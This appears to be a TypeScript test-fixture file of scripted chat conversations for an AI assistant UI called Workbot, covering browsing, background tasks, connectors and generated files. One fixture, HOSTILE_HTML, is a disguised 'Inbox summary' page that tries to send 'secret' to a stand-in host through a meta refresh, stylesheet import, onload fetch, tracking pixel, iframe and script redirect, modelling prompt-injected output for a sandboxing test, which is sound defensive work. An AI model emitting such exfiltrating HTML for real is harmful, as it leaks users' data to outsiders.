/**
 * Test-only conversations for chat-screen-server.ts, in the shape `GET /v1/workbot` answers. Each scenario is a
 * function so every server start begins from the same conversation.
 */
type Part = { kind: "text"; text: string; step?: number } | { kind: "steps"; steps: unknown[] }
export type FixtureTurn = {
  id: string
  text: string
  sentAt: number | null
  finishedAt: number | null
  status: "queued" | "working" | "done" | "failed" | "stopped"
  attachments: Array<{ id: string; name: string; mediaType: string; size: number }>
  parts: Part[]
  modelSteps: number
  error: string | null
  tasks?: unknown[]
  greeting?: boolean
  outputs?: Array<{ id: string; name: string; mediaType: string; size: number; updatedAt?: number }>
}
export type FixtureThread = { name: string; organizationName: string; status: "idle" | "busy"; turns: FixtureTurn[]; hasEarlier: boolean; filesEnabled: boolean }

const minutesAgo = (minutes: number) => Date.now() - minutes * 60_000
const said = (text: string, step = 0): Part => ({ kind: "text", text, step })
export const turn = (id: string, text: string, at: number, parts: Part[], extra: Partial<FixtureTurn> = {}): FixtureTurn =>
  ({ id, text, sentAt: at, finishedAt: at + 2_000, status: "done", attachments: [], parts, modelSteps: parts.length, error: null, ...extra })
export const hello = (): FixtureTurn => turn("hello", "", minutesAgo(30), [said("Hey Sam, happy Saturday. What can I do for you?")], { greeting: true })

const ago = (seconds: number) => Date.now() - seconds * 1_000
const appStep = (label: string, app: string, running: boolean, at: number) => ({ label, icon: "app", status: running ? "running" : "done", app, startedAt: at, finishedAt: running ? null : at + 2_000, updates: [] })
const computerStep = (updates: string[], running: boolean, at: number, extra: Record<string, unknown> = {}) =>
  ({ label: "Using the browser", icon: "computer", status: running ? "running" : "done", app: null, startedAt: at, finishedAt: running ? null : at + 5_000, updates, ...extra })
const working = (turnValue: FixtureTurn): FixtureTurn => ({ ...turnValue, status: "working", finishedAt: null })

export const scenarios: Record<string, () => FixtureThread> = {
  remote: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("remote-parent", "Check the browser changes on my Mac Studio", ago(400), [said("The checks are running on your Mac Studio. I'll reply here with the result.")], {
      tasks: [
        { id: "remote-parent.t1", title: "Watch the remote session", status: "working", startedAt: ago(300), finishedAt: null, update: null, updates: [], steps: [], stepsDone: 0, note: null },
        { id: "remote-parent.t2", title: "3D room planner", status: "stopped", startedAt: ago(13_000), finishedAt: ago(12_000), update: null, updates: [], steps: [], stepsDone: 0, note: null },
      ],
    })],
  }),
  /** Accepted, deliberately slow first token: the acknowledgement must not depend on a model response. */
  waiting: () => ({ name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [hello(), working(turn("w1", "Use the browser to open YouTube", Date.now(), [], { modelSteps: 0 }))],
  }),
  /** Hours-old stopped job must never hold the header or offer Stop. */
  stopped: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("s1", "Build a 3D room planner", ago(13_000), [said("I stopped the room planner.")], {
      tasks: [{ id: "s1.t1", title: "3D room planner", status: "stopped", startedAt: ago(13_000), finishedAt: ago(12_000), update: null, updates: [], steps: [], stepsDone: 0, note: null }],
    })],
  }),
  /** #6: Workbot searching YouTube in its browser, without showing its screen. */
  browsing: () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      working(turn("b1", "Find Chris Young's salmon tips, he has a thermometer", ago(70), [
        said("On it: I'll look through Chris Young's videos for his salmon advice and the thermometer he uses, and send you the best two with timestamps. A couple of minutes."),
        { kind: "steps", steps: [appStep("Searching Slack", "Slack", false, ago(65)), computerStep(["Opening youtube.com/results", "Searching YouTube"], true, ago(55), { surface: "browser" })] },
      ], { modelSteps: 2 })),
    ],
  }),
  /** Deterministic running task for preview ownership/control proofs; no external identity. */
  "browser-lifecycle": () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [hello(), working(turn("browser_live", "Open the project page in your browser", ago(10), [
      said("I'll open the project page in my browser."),
      { kind: "steps", steps: [computerStep(["Opening the project page"], true, ago(5), { surface: "browser" })] },
    ], { modelSteps: 2 }))],
  }),
  /** #9 and #10: a background task building an app, then a quick command on the computer. */
  task: () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("t1", "Code me an app that canothanize my Space in 3d", ago(140), [said("Fun one. I'll build you a 3D room planner.")], {
        tasks: [{ id: "t1.t1", title: "3D room planner", status: "working", startedAt: ago(135), finishedAt: null, update: "Building the planner", updates: ["Setting up the project", "Building the planner"],
          steps: [{ label: "Searching Google Drive", done: true, at: ago(130) }, { label: "Setting up the project", done: true, at: ago(110) }, { label: "Building the planner", done: false, at: ago(40) }], stepsDone: 2, note: "Planning the layout first: walls, then furniture you can drag." }],
      }),
      working(turn("t2", "This looks very ugly I also hate the way you show you're working on your computer", ago(20), [
        { kind: "steps", steps: [{ label: "Working on my computer", icon: "computer", status: "running", app: null, startedAt: ago(15), finishedAt: null, updates: ["Opening your screenshot"], background: true }] },
      ], { modelSteps: 1 })),
    ],
  }),
  /** Nov 8: "Could you go on google.com with browser", as the conversation is read once it is done (see googleAt). */
  google: () => googleAt(2),
  exa: () => exaAt(3),
  connectors: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("stack", "Find the UX research, check our design notes, and put the next steps in Linear.", minutesAgo(1), [
      said("I checked the research and your team's notes. The next steps are in Linear."),
      { kind: "steps", steps: ["Exa", "Exa", "Google Drive", "Linear", "Slack", "GitHub", "PlanetScale", "Research"].map((app) => ({ ...appStep(`Checking ${app}`, app, false, ago(20)), detail: "Read notes" })) },
    ])],
  }),
  /** Files Workbot made: an interactive app (a live thumbnail), then a report and a spreadsheet (placeholders by type). */
  artifacts: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("a1", "Code me an app that organizes my space in 3D", minutesAgo(8), [said("Here's your 3D space organizer. Drag the boxes to plan the room; the shelf list on the right updates as you go.")], {
        outputs: [ARTIFACT_FILES.organizer],
      }),
      turn("a2", "Can you also write up the plan and the shopping list?", minutesAgo(3), [said("Done: the plan is in the report and the shopping list is a spreadsheet.")], {
        outputs: [ARTIFACT_FILES.report, ARTIFACT_FILES.shopping],
      }),
    ],
  }),
  /** An app that tries to reach the network and navigate by itself: its card must do neither until it is opened. */
  "artifact-hostile": () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("h1", "Summarize my inbox as a page", minutesAgo(2), [said("Here's the summary page.")], { outputs: [ARTIFACT_FILES.hostile] })],
  }),
  /** Short and long messages from the person (#1, #2): "Hey" must stay on one line. */
  bubbles: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("m1", "Hey", minutesAgo(6), [said("Hey! What's up?")]),
      turn("m2", "ok", minutesAgo(5), [said("👍")]),
      turn("m3", "Los notifs on the same image how the bubble seems a bit cut", minutesAgo(4), [said("Added as #2, using the same screenshot.")]),
    ],
  }),
}

/**
 * Ben's request of Nov 8 at each point the page reads it: 0, the call is being written and nothing is stored yet (the
 * live `working` events in GOOGLE_EVENTS are all the page has); 1, the browser call is stored and running; 2, done.
 */
export function googleAt(phase: 0 | 1 | 2): FixtureThread {
  const sent = Date.now() - 6_000
  const step = computerStep(["Opening google.com"], phase === 1, sent + 1_000, { surface: "browser", pages: [{ id: "g00gle", url: "https://www.google.com/", title: "google.com" }] })
  const parts: Part[] = phase === 0 ? [] : phase === 1 ? [{ kind: "steps", steps: [step] }] : [{ kind: "steps", steps: [step] }, said("Done: google.com is open in my browser.", 1)]
  const asked = turn("g1", "Could you go on google.com with browser", sent, parts, { modelSteps: phase === 0 ? 0 : phase === 1 ? 1 : 2 })
  return { name: "Workbot", organizationName: "Example Team", status: phase === 2 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 2 ? asked : working(asked)] }
}

/**
 * Ben's request of Nov 8 at 7:33 ("could you use exa to search about best ux practices and skills"), in the shape
 * workbot-server builds from the runner's transcript for `mcp:<connection>:web_search_exa` calls: 0, the first search
 * is running; 1, the second; 2, both done while Workbot reads the results; 3, answered (also what a reload reads).
 */
export function exaAt(phase: 0 | 1 | 2 | 3): FixtureThread {
  const sent = Date.now() - 12_000
  const search = (running: boolean, at: number) => ({ ...appStep("Searching Exa", "Exa", running, at), detail: "Web search", site: "exa.ai" })
  const steps = phase === 0 ? [search(true, sent + 1_000)] : [search(false, sent + 1_000), search(phase === 1, sent + 4_000)]
  const parts: Part[] = [said("I'll search Exa for best UX practices and skills, then I'll come back with the useful bits."), { kind: "steps", steps }]
  if (phase === 3) parts.push(said("Here's what stands out: keep feedback immediate, show system status, and make every action reversible.", 2))
  const asked = turn("x1", "could you use exa to search about best ux practices and skills", sent, parts, { modelSteps: phase === 0 ? 1 : phase === 3 ? 3 : 2 })
  return { name: "Workbot", organizationName: "Example Team", status: phase === 3 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 3 ? asked : working(asked)] }
}

/** What the page hears while the call is written, as workbot-server sends it: the start, then where, then what. */
export const GOOGLE_EVENTS = [
  { type: "working", messageId: "g1", step: 0, on: "computer" },
  { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser" },
  { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser", update: "Opening google.com" },
]

/** A small interactive app, as Workbot writes one: its <title> names the card. */
const ORGANIZER_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>3D Space Organizer</title>
<style>
body{margin:0;font:13px/1.4 system-ui,sans-serif;background:linear-gradient(180deg,#eef3f8,#dfe8f1);color:#11181c;height:100vh;display:flex}
main{flex:1;display:grid;place-items:center;perspective:1200px}
.room{width:420px;height:300px;position:relative;transform:rotateX(58deg) rotateZ(-38deg);transform-style:preserve-3d;background:#fdfdfd;box-shadow:0 30px 60px -20px #01162744;border-radius:6px;
  background-image:linear-gradient(#0116270f 1px,transparent 1px),linear-gradient(90deg,#0116270f 1px,transparent 1px);background-size:30px 30px}
.box{position:absolute;transform-style:preserve-3d;cursor:grab;border-radius:3px}
.box::before{content:"";position:absolute;inset:0;transform:translateZ(var(--h));background:inherit;filter:brightness(1.08);border-radius:3px}
aside{width:220px;background:#fff;border-left:1px solid #0116270f;padding:20px}
h1{font-size:15px;margin:0 0 12px}li{display:flex;gap:8px;align-items:center;padding:6px 0;border-bottom:1px solid #0116270d}
i{width:10px;height:10px;border-radius:3px;display:inline-block}ul{list-style:none;margin:0;padding:0}
@media(max-width:700px){body{flex-direction:column}.room{width:300px;height:220px}aside{width:auto;border-left:0;border-top:1px solid #0116270f}}
</style></head><body><main><div class="room" id="room"><div class="box" style="left:20px;top:20px;width:60px;height:180px;background:#5b8def;--h:80px"></div><div class="box" style="left:120px;top:30px;width:150px;height:70px;background:#f0a35e;--h:40px"></div><div class="box" style="left:300px;top:40px;width:80px;height:80px;background:#4fb38a;--h:50px"></div><div class="box" style="left:130px;top:200px;width:170px;height:70px;background:#a78bdb;--h:30px"></div><div class="box" style="left:340px;top:220px;width:40px;height:40px;background:#7cc36b;--h:60px"></div></div></main>
<aside><h1>Shelves and storage</h1><ul>
<li><i style="background:#5b8def"></i>Bookshelf</li><li><i style="background:#f0a35e"></i>Desk</li><li><i style="background:#4fb38a"></i>Storage bins</li><li><i style="background:#a78bdb"></i>Sofa</li><li><i style="background:#7cc36b"></i>Plant</li></ul></aside>
<script>
for(const b of document.querySelectorAll(".box"))b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}
</script></body></html>`

/** Model-written HTML that tries to send what it holds elsewhere the moment it renders (prompt injection). */
const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><meta http-equiv="refresh" content="0;url=http://exfil.invalid/refresh?d=secret">
<link rel="stylesheet" href="http://exfil.invalid/style.css"><style>@import url(http://exfil.invalid/import.css);body{font:14px system-ui;padding:24px}</style></head>
<body onload="fetch('http://exfil.invalid/onload?d=secret')"><h1>Inbox summary</h1><p>Three threads need a reply today: the vendor invoice, the offsite plan and the hiring loop.</p>
<img src="http://exfil.invalid/pixel.png?d=secret" alt=""><iframe src="http://exfil.invalid/frame"></iframe>
<script>fetch("http://exfil.invalid/script?d=secret");location.href="http://exfil.invalid/navigate?d=secret"</script></body></html>`

const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),IKEA,49\nStorage bins x4,Container Store,36\nDesk lamp,Target,29\nPlant stand,IKEA,19\n"

/** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string }> = {
  "out-organizer": { mediaType: "text/html", bytes: ORGANIZER_HTML },
  "out-hostile": { mediaType: "text/html", bytes: HOSTILE_HTML },
  "out-report": { mediaType: "application/pdf", bytes: "%PDF-1.4\n% fixture\n" },
  "out-shopping": { mediaType: "text/csv", bytes: SHOPPING_CSV },
}
const ARTIFACT_FILES = {
  organizer: { id: "out-organizer", name: "space-organizer.html", mediaType: "text/html", size: ORGANIZER_HTML.length, updatedAt: 1 },
  hostile: { id: "out-hostile", name: "inbox-summary.html", mediaType: "text/html", size: HOSTILE_HTML.length, updatedAt: 1 },
  report: { id: "out-report", name: "Room plan.pdf", mediaType: "application/pdf", size: 48_211, updatedAt: 1 },
  shopping: { id: "out-shopping", name: "Shopping list.csv", mediaType: "text/csv", size: SHOPPING_CSV.length, updatedAt: 1 },
}
